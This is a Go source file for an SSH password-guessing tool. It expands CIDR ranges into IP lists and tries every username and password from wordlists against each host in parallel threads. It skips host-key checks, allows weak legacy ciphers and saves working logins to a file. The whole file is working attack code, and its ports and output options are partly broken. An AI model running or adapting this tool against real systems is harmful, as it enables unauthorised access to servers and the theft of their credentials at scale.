package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"
	"net"
	"golang.org/x/crypto/ssh"
	"github.com/spf13/pflag"
)

// sshConnect attempts to connect to the host using the provided username and password.
func sshConnect(hostPort, username, password string, timeout time.Duration) {
	// Set timeout for the connection
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout, // Set timeout for the connection
		Config: ssh.Config{
			Ciphers: []string{
				"aes128-ctr", "aes192-ctr", "aes256-ctr",
				"aes128-cbc", "aes192-cbc", "aes256-cbc",
				"3des-cbc", "blowfish-cbc", "cast128-cbc",
				"chacha20-poly1305@openssh.com", "aes128-gcm@openssh.com", "aes256-gcm@openssh.com",
			},
			KeyExchanges: []string{
				"curve25519-sha256", "ecdh-sha2-nistp256", "ecdh-sha2-nistp384", "ecdh-sha2-nistp521",
				"diffie-hellman-group14-sha1", "diffie-hellman-group1-sha1", "diffie-hellman-group-exchange-sha256",
				"diffie-hellman-group-exchange-sha1",
			},
			MACs: []string{
				"hmac-sha2-256", "hmac-sha2-512", "hmac-sha1",
				"hmac-md5", "umac-128@openssh.com", "hmac-sha2-256-etm@openssh.com", "hmac-sha2-512-etm@openssh.com",
			},
		},
	}

	// Attempt to connect with timeout
	client, err := ssh.Dial("tcp", hostPort, config)
	if err != nil {
		if strings.Contains(err.Error(), "unable to authenticate") {
			fmt.Printf("Failed: %s with Username - %s and Password - %s\n", hostPort, username, password)
		} else {
			fmt.Printf("Error connecting to %s: %v\n", hostPort, err)
		}
		return
	}
	defer client.Close()

	// Successful connection
	fmt.Printf("Success: %s with Username - %s and Password - %s\n", hostPort, username, password)
	f, err := os.OpenFile("credentials_found.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	if _, err := f.WriteString(fmt.Sprintf("%s;%s;%s\n", hostPort, username, password)); err != nil {
		log.Fatal(err)
	}
}

// parseCIDR reads CIDR range or IP addresses and generates corresponding IPs.
func parseCIDR(file string) ([]string, error) {
	var ipList []string
	fileContent, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(fileContent), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Handle CIDR notation and single IP addresses
		if strings.Contains(line, "/") {
			_, network, err := net.ParseCIDR(line)
			if err != nil {
				return nil, fmt.Errorf("invalid CIDR format: %v", err)
			}

			// Generate all IPs in the CIDR block
			for ip := network.IP; network.Contains(ip); incrementIP(ip) {
				ipList = append(ipList, ip.String())
			}
		} else {
			ipList = append(ipList, line) // Single IP address
		}
	}
	return ipList, nil
}

// incrementIP increments the last octet of an IP address.
func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// readFile reads the input file and parses each line into host, username, and password.
func readFile(filename string) ([][3]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var entries [][3]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		parts := strings.Split(line, ";")
		if len(parts) != 3 {
			fmt.Printf("Invalid format skipped: %s\n", line)
			continue
		}
		entries = append(entries, [3]string{parts[0], parts[1], parts[2]}) // host:port, user, pass
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return entries, nil
}

func main() {
	// Parsing command-line arguments
	var threads int
	var timeout int
	var checkFile, forceFile, loginFile, passFile, outputFile string
	var debug bool
	var ports string

	pflag.IntVar(&threads, "threads", 10, "Number of concurrent threads")
	pflag.IntVar(&timeout, "timeout", 5, "Connection timeout in seconds")
	pflag.StringVar(&checkFile, "check", "", "Input file with format ip:port;user;pass")
	pflag.StringVar(&forceFile, "force", "", "Input file with CIDR or IP range")
	pflag.StringVar(&loginFile, "login", "", "File containing list of usernames")
	pflag.StringVar(&passFile, "pass", "", "File containing list of passwords")
	pflag.StringVar(&ports, "ports", "22", "Ports to use for SSH connection (comma or range, e.g., 22,2222 or 22-223)")
	pflag.StringVar(&outputFile, "output", "credentials_found.txt", "File to store results")
	pflag.BoolVar(&debug, "debug", false, "Enable debug mode")
	pflag.Parse()

	// Setup timeout
	timeoutDuration := time.Duration(timeout) * time.Second

	if checkFile != "" {
		entries, err := readFile(checkFile)
		if err != nil {
			log.Fatalf("Error reading check file: %v", err)
		}
		var wg sync.WaitGroup
		sem := make(chan struct{}, threads)
		for _, entry := range entries {
			hostPort, username, password := entry[0], entry[1], entry[2]
			wg.Add(1)
			go func(hostPort, username, password string) {
				defer wg.Done()
				sem <- struct{}{}
				sshConnect(hostPort, username, password, timeoutDuration)
				<-sem
			}(hostPort, username, password)
		}
		wg.Wait()
	}

	if forceFile != "" {
		ips, err := parseCIDR(forceFile)
		if err != nil {
			log.Fatalf("Error parsing force file: %v", err)
		}

		loginList, err := os.ReadFile(loginFile)
		if err != nil {
			log.Fatalf("Error reading login file: %v", err)
		}

		passList, err := os.ReadFile(passFile)
		if err != nil {
			log.Fatalf("Error reading pass file: %v", err)
		}

		// Generate the combinations of IP, username, and password on the fly
		var wg sync.WaitGroup
		sem := make(chan struct{}, threads)
		for _, ip := range ips {
			for _, user := range strings.Split(string(loginList), "\n") {
				for _, pass := range strings.Split(string(passList), "\n") {
					wg.Add(1)
					go func(ip, user, pass string) {
						defer wg.Done()
						sem <- struct{}{}
						hostPort := fmt.Sprintf("%s:%s", ip, ports)
						sshConnect(hostPort, user, pass, timeoutDuration)
						<-sem
					}(ip, user, pass)
				}
			}
		}
		wg.Wait()
	}
}
